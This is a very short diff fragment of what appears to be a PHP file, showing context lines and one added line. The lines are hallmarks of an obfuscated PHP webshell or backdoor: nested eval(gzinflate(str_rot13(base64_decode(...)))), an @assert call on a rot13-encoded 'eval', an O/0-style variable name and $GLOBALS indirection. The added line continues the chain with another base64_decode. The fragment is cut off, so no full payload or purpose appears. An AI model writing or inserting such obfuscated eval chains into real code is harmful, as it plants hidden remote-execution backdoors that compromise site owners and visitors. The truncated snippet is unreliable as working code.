@@ -285,3 +285,4 @@ $O00OO0=urldecode(
 eval(gzinflate(str_rot13(base64_decode(
 @assert(str_rot13('riny
 ($a, $b){$c=$GLOBALS
+=base64_decode($
